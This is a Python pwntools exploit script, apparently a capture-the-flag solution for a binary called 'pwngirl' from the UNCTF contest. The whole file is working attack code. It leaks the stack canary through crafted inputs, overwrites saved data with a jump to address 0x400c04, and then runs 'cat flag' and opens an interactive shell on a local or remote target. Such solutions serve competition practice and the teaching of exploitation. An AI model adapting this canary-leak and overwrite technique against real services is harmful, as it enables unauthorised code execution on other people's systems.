#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

while 1:
    try:
        local_file  = './pwngirl'
        local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
        remote_libc = local_libc # '../libc.so.6'

        is_local = False
        is_remote = False

        if len(sys.argv) == 1:
            is_local = True
            p = process(local_file)
            libc = ELF(local_libc)
        elif len(sys.argv) > 1:
            is_remote = True
            if len(sys.argv) == 3:
                host = sys.argv[1]
                port = sys.argv[2]
            else:
                host, port = sys.argv[1].split(':')
            p = remote(host, port)
            libc = ELF(remote_libc)

        elf = ELF(local_file)

        # context.log_level = 'debug'
        context.arch = elf.arch

        se      = lambda data               :p.send(data) 
        sa      = lambda delim,data         :p.sendafter(delim, data)
        sl      = lambda data               :p.sendline(data)
        sla     = lambda delim,data         :p.sendlineafter(delim, data)
        sea     = lambda delim,data         :p.sendafter(delim, data)
        rc      = lambda numb=4096          :p.recv(numb)
        ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
        uu32    = lambda data               :u32(data.ljust(4, '\0'))
        uu64    = lambda data               :u64(data.ljust(8, '\0'))
        info_addr = lambda tag              :p.info(tag + ': {:#x}'.format(eval(tag)))

        def debug(cmd=''):
            if is_local: gdb.attach(p,cmd)

        # info
        sla('[Y/N/@]','@^^')
        sla('name:','Imagin')
        sla('have?\n','15')
        for i in range(10):
            sla('girlfriends:','0')
        sla('girlfriends:','-')
        sla('girlfriends:','-')
        sla('girlfriends:','0')
        sla('girlfriends:','0')
        sla('girlfriends:',str(0x400c04))

        ru('result:')
        data = ru('  you can change your girlfriend\n').split()
        tmp = [(eval(i)) for i in set(data)]
        tmp.remove(0)
        tmp.remove(0x400c04)
        print tmp

        # get canary
        for i in tmp:
            if i&0xff:
                p1 = i
            else:
                p2 = i
        print p1,p2
        print hex(p1&0xffffffff),hex(p2&0xffffffff)
        canary = u64(p32(p2&0xffffffff)+p32(p1&0xffffffff))
        info_addr('canary')

        # bp
        if p2 > p1 or p1 > 0:
            print "try again again"
            p.close()
            continue            

        sl('0')
        sla('which girlfriend do you want to change?','13')
        sla('now change:\n',str(p1&0xffffffff))
        for i in range(11):
            sla('now change:\n',str(p2&0xffffffff))
        # debug()
        sla('now change:\n','-')

        sl('cat flag')
        data = rc()
        if 'UNCTF' in data:
            print data
            p.interactive()
            exit()
        p.close()
        print p1,p2
    except Exception as e:
        print "again"
